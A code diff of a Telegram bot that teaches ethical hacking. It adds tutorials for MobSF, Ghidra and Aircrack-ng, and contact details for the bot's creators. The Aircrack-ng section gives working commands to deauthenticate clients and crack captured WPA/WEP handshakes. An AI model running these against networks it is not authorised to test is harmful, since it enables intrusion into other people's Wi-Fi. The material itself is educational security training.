+            "- Auditing third-party apps\n"
+            "- Malware detection in Android/iOS packages\n\n"
+
+            "🎓 *Practice Tasks:*\n"
+            "✅ Upload a known APK like WhatsApp clone\n"
+            "✅ Check if it's debuggable or has exposed components\n"
+            "✅ Try decompiling an APK with MobSF and locate strings\n"
+            "✅ Enable dynamic analysis and inspect API traffic\n\n"
+
+            "🧠 *Pro Tips:*\n"
+            "- Use with Genymotion or emulator for better dynamic analysis\n"
+            "- Check MobSF logs for deeper insights\n"
+            "- Automate using MobSF REST API\n\n"
+
+            "🚨 *Note:*\n"
+            "Only analyze apps you own or have permission to audit. Reverse engineering others' APKs without consent may be illegal.\n\n"
+
+            "🏁 *Conclusion:*\n"
+            "MobSF is a must-have mobile analysis tool for ethical hackers, bug bounty hunters, and malware researchers.\n"
+            "_Secure the app before the attacker breaks it!_ 🛡️📱",
+
+"ghidra": "*🧰 Ghidra* – Reverse Engineering & Malware Analysis Tool\n\n"
+        "🧠 *What is Ghidra?*\n"
+        "Ghidra is a powerful reverse engineering framework developed by the NSA.\n"
+        "It's used to analyze compiled programs (binaries) and detect hidden behavior, malware, and vulnerabilities.\n\n"
+
+        "🛠 *Installation:*\n"
+        "1. Download from:\n"
+        "[https://ghidra-sre.org](https://ghidra-sre.org)\n"
+        "2. Extract the archive\n"
+        "3. Run:\n"
+        "`./ghidraRun` (Linux/macOS)\n"
+        "or\n"
+        "`ghidraRun.bat` (Windows)\n\n"
+
+        "📦 *Supported File Types:*\n"
+        "- `.exe`, `.bin`, `.elf`, `.so`, `.dll`, `.apk`, firmware dumps\n"
+        "- x86, ARM, MIPS, PowerPC architectures\n\n"
+
+        "🔍 *Core Features:*\n"
+        "- Disassembler\n"
+        "- Decompiler (convert assembly to C-like code)\n"
+        "- Binary analysis\n"
+        "- Patch editor\n"
+        "- Symbolic analysis and graph views\n\n"
+
+        "⚙️ *Workflow Overview:*\n"
+        "1. Start Ghidra → Create a project\n"
+        "2. Import a binary\n"
+        "3. Analyze with default options\n"
+        "4. Explore Decompiled Code\n"
+        "5. Navigate functions, strings, symbols\n\n"
+
+        "🔐 *Reverse Engineering Tasks:*\n"
+        "- Identify malware behavior\n"
+        "- Find hardcoded credentials\n"
+        "- Analyze control flow and function logic\n"
+        "- Patch binary logic\n"
+        "- Study obfuscation & encryption routines\n\n"
+
+        "🎯 *Use Cases:*\n"
+        "- Malware reverse engineering\n"
+        "- Exploit development\n"
+        "- CTF/Forensics challenges\n"
+        "- Security research\n\n"
+
+        "🎓 *Practice Tasks:*\n"
+        "✅ Import a simple C-compiled binary and inspect the `main()`\n"
+        "✅ Use `Search → Strings` to locate hints\n"
+        "✅ Follow assembly flow using decompiler\n"
+        "✅ Modify hex data or patch functions\n"
+        "✅ Try analyzing a crackme file (from crackmes.one)\n\n"
+
+        "🧠 *Advanced Tips:*\n"
+        "- Use bookmarks to mark functions\n"
+        "- Rename variables for easier tracking\n"
+        "- Use *Function Graph View* for control flow analysis\n"
+        "- Integrate Python scripts for automation\n\n"
+
+        "📁 *Export Features:*\n"
+        "- Export decompiled code\n"
+        "- Save custom reports\n"
+        "- Create binary patches\n\n"
+
+        "🚨 *Ethical Warning:*\n"
+        "Ghidra is for RESEARCH & LEGAL use only. Use it only on binaries you’re authorized to analyze.\n\n"
+
+        "🏁 *Conclusion:*\n"
+        "Ghidra is a world-class reverse engineering suite for dissecting and understanding binaries. With powerful analysis tools, it rivals commercial RE tools like IDA Pro.\n"
+        "_Reverse like a pro with Ghidra!_ 🧠💻",
+
+    "aircrackng": "*📡 Aircrack-ng* – Wi-Fi Cracking & Wireless Security Suite\n\n"
+        "🧠 *What is Aircrack-ng?*\n"
+        "Aircrack-ng is a complete suite of tools to assess Wi-Fi network security.\n"
+        "It allows packet capturing, deauthentication, handshake capture, and cracking WEP/WPA/WPA2 keys.\n\n"
+
+        "🛠 *Installation:*\n"
+        "*Kali Linux:* Pre-installed\n"
+        "*Ubuntu/Debian:*\n"
+        "`sudo apt update && sudo apt install aircrack-ng`\n"
+        "*macOS (via Homebrew):*\n"
+        "`brew install aircrack-ng`\n\n"
+
+        "📦 *Tools Included:*\n"
+        "- `airmon-ng`: Enables monitor mode\n"
+        "- `airodump-ng`: Captures packets & handshakes\n"
+        "- `aireplay-ng`: Injects/deauths packets\n"
+        "- `aircrack-ng`: Cracks captured handshakes\n\n"
+
+        "📡 *Monitor Mode Setup:*\n"
+        "Enable monitor mode on your Wi-Fi card:\n"
+        "`sudo airmon-ng check kill`\n"
+        "`sudo airmon-ng start wlan0`\n"
+        "Interface changes to `wlan0mon`\n\n"
+
+        "🔍 *Capture Handshake:*\n"
+        "1. Run airodump-ng:\n"
+        "`sudo airodump-ng wlan0mon`\n"
+        "2. Note target BSSID and channel (CH)\n"
+        "3. Capture handshake:\n"
+        "`sudo airodump-ng --bssid <BSSID> -c <CH> -w capture wlan0mon`\n"
+        "4. Deauthenticate client:\n"
+        "`sudo aireplay-ng -0 10 -a <BSSID> wlan0mon`\n\n"
+
+        "💥 *Crack the Handshake:*\n"
+        "`aircrack-ng -w rockyou.txt capture.cap`\n"
+        "Requires handshake in `.cap` file and a good wordlist\n\n"
+
+        "🎯 *Wordlists for Cracking:*\n"
+        "- `/usr/share/wordlists/rockyou.txt`\n"
+        "- Use `crunch`, `cewl`, or `cupp` to create custom wordlists\n\n"
+
+        "🔐 *WEP Cracking (Old networks):*\n"
+        "1. Capture IV packets using airodump-ng\n"
+        "2. Use aireplay-ng to inject packets:\n"
+        "`aireplay-ng -3 -b <BSSID> wlan0mon`\n"
+        "3. Crack with:\n"
+        "`aircrack-ng wep.cap`\n\n"
+
+        "📚 *Real-World Practice:*\n"
+        "✅ Practice on your own router or with tools like *Wi-Fi Pumpkin*, *Fluxion*, or a test lab.\n"
+        "✅ Use `wifite` to automate the process\n"
+        "✅ Analyze captured packets with Wireshark\n\n"
+
+        "🧠 *Pro Tips:*\n"
+        "- Use a compatible Wi-Fi adapter that supports monitor mode and injection (e.g., Alfa AWUS036NHA)\n"
+        "- Place antenna close to the target for better signal\n"
+        "- Use channel locking in airodump-ng to avoid missing handshake\n\n"
+
+        "⚠️ *Legal Warning:*\n"
+        "Never use Aircrack-ng on networks you don't own or have permission to test. Unauthorized access is illegal and unethical.\n\n"
+
+        "🏁 *Conclusion:*\n"
+        "Aircrack-ng is a powerful wireless auditing toolset used by ethical hackers to test Wi-Fi security. Mastering it gives you deep insights into wireless networks and their weaknesses.\n"
+        "_Capture the handshake, crack the code!_ 📶🔓",
 
     "career": "*📈 Career & Certifications:*\n\nChoose a sub-topic below to explore your future in ethical hacking:",
 
@@ -754,29 +1432,6 @@ content = {
 
 }
 
-keyword_content = {
-    "nikto": content["nikto"],
-    "linux command": content["LC"],
-    "linux commands": content["LC"],
-    "about linux": content["LC"],
-    "nmap": content["nmap"],
-    "cowsay": "🐮 *cowsay* lets an ASCII cow speak your message:\n`sudo apt install cowsay`\nExample: `cowsay Hello, Hacker!`",
-    "cmatrix": "🟢 *Matrix Rain Effect (cmatrix)*:\n`sudo apt install cmatrix`\nRun with: `cmatrix`",
-    "sl": "🚂 *Steam Locomotive (sl)*: A funny tool when you mistype `ls`\n`sudo apt install sl`",
-    "lolcat": "🌈 *Colorful Output (lolcat)*: Pipe any command into `lolcat` for rainbow output.\n`echo Hello | lolcat`",
-    "asciiquarium": "🐠 *ASCII Aquarium*: `asciiquarium` shows fish in terminal.\nInstall with: `sudo apt install libcurses-perl && wget https://raw.githubusercontent.com/cmatsuoka/asciiquarium/master/asciiquarium -O /usr/local/bin/asciiquarium && chmod +x /usr/local/bin/asciiquarium`",
-    "telnet star wars": "⭐ *Star Wars in ASCII*:\n`telnet towel.blinkenlights.nl`",
-    "figlet": "🔤 *FIGlet*: Convert text into ASCII banner font:\n`sudo apt install figlet`\n`figlet H4cker`",
-    "toilet": "🚽 *toilet*: Similar to `figlet` but with effects.\n`sudo apt install toilet`",
-    "rev": "🔁 *rev*: Reverses input text.\n`echo hello | rev` → `olleh`",
-    "yes": "🔁 *yes*: Prints text repeatedly.\n`yes I am a hacker`",
-
-    "hacker": "💻 *Hacker Mode*: Use `hollywood` for a simulated hacker terminal effect.\n`sudo apt install hollywood`\nRun with: `hollywood`",
-    "oneko": "🐱 *Oneko*: A cat chases your cursor.\n`sudo apt install oneko`\nRun with: `oneko`",
-    "aafire": "🔥 *ASCII Fire*: Displays fire animation in terminal.\n`sudo apt install aafire`\nRun with: `aafire`",
-    "h4cker": "👾 *H4cker Bot*: Type `/start` to interact with the bot and learn hacking topics.",
-},
-
 
 def get_keyboard(topic):
     buttons = [[InlineKeyboardButton(text, callback_data=data)] for text, data in topics.get(topic, [])]
@@ -822,21 +1477,21 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await query.message.reply_text("❌ Invalid option. Please try again.")
 
-
-# --- Keyword/Text Handler with Fuzzy Matching ---
 async def keyword_responder(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message.text.lower().strip()
+    if msg.startswith("/"):
+        msg = msg[1:]  # Remove command slash if present
 
     # Check exact match
-    if msg in keyword_content:
-        await update.message.reply_text(keyword_content[msg], parse_mode="Markdown")
+    if msg in content:
+        await update.message.reply_text(content[msg], parse_mode="Markdown")
         return
 
     # Try fuzzy match
-    matches = difflib.get_close_matches(msg, keyword_content.keys(), n=1, cutoff=0.6)
+    matches = difflib.get_close_matches(msg, content.keys(), n=1, cutoff=0.4)
     if matches:
         await update.message.reply_text(
-            f"🔍 Showing result for *{matches[0]}*:\n\n{keyword_content[matches[0]]}",
+            f"🔍 Showing result for *{matches[0]}*:\n\n{content[matches[0]]}",
             parse_mode="Markdown"
         )
         return
@@ -853,27 +1508,35 @@ async def dynamic_command_handler(update: Update, context: ContextTypes.DEFAULT_
 
 async def owner_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "*👨‍💻 Bot Owner Details:*\n\n"
-        "*Name:* Ankit kushwaha\n"
-        "*Role:* Ethical Hacker & Developer\n"
-        "*Telegram:* [@H4cker_ank](https://t.me/H4cker_ank)\n"
-        "*GitHub:* [github.com/ankitkushwaha-ank](https://github.com/ankitkushwaha-ank)\n"
-        "*Email:* Ankitkushwaha.ank@gmail.com\n"
-        "*About Me:* I created this bot to help students learn ethical hacking from beginner to advanced level using practical examples.\n\n"
-        "_Keep learning, stay curious, and hack the right way!_ 🛡️💻",
+        "*🤖 H4cker Bot Owners & Creators:*\n\n"
+        "👨‍💻 *Ankit Kushwaha*\n"
+        "• *Role:* Ethical Hacker | Full-Stack Developer\n"
+        "• *Telegram:* [@H4cker_ank](https://t.me/H4cker_ank)\n"
+        "• *GitHub:* [github.com/ankitkushwaha-ank](https://github.com/ankitkushwaha-ank)\n"
+        "• *Email:* ankitkushwaha.ank@gmail.com\n\n"
+
+        "👩‍💻 *Aayushi Kumari*\n"
+        "• *Role:* Security Researcher | Cybersecurity Enthusiast\n"
+        "• *Telegram:* [@OutlierAashi](https://t.me/@OutlierAashi)\n"
+        "• *GitHub:* [github.com/Aashi-code77)](https://github.com/Aashi-code77)\n"
+        "• *Email:* pandaoutlier@gmail.com\n\n"
+
+        "💡 *About:* We created *H4cker Bot* to make cybersecurity learning accessible, structured, and fun. This bot provides a 30-day roadmap, tool-based tutorials, and career guidance for aspiring ethical hackers.\n\n"
+        "_Keep exploring, keep learning, and always hack ethically!_ 🔐✨",
         parse_mode="Markdown",
         disable_web_page_preview=True
     )
+
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "*🆘 Help Menu:*\n\n"
         "Use the following commands to interact with the bot:\n"
-        "- `/start`: Start the bot and see main topics\n"
-        "- `/owner`: Get information about the bot owner\n"
-        "- `/help`: Show this help message\n"
-        "- Type keywords like 'nmap', 'linux command', etc. to get quick tips\n"
-        "- Use commands like `/day1`, `/day2`, etc. for daily learning content",
+        "/start : Start the bot and see main topics\n"
+        "/owner : Get information about the bot owner\n"
+        "/help : Show this help message\n\n"
+        "Type keywords like 'nmap', 'linux command', etc. to get quick tips\n\n"
+        "Use commands like /day1, /day2, etc. for daily learning content",
         parse_mode="Markdown"
     )
 
@@ -883,6 +1546,7 @@ if __name__ == '__main__':
     app.add_handler(CallbackQueryHandler(handle_buttons))
     app.add_handler(CommandHandler("owner", owner_info))
     app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, keyword_responder))
 
     for key in content.keys():
         app.add_handler(CommandHandler(key, dynamic_command_handler))
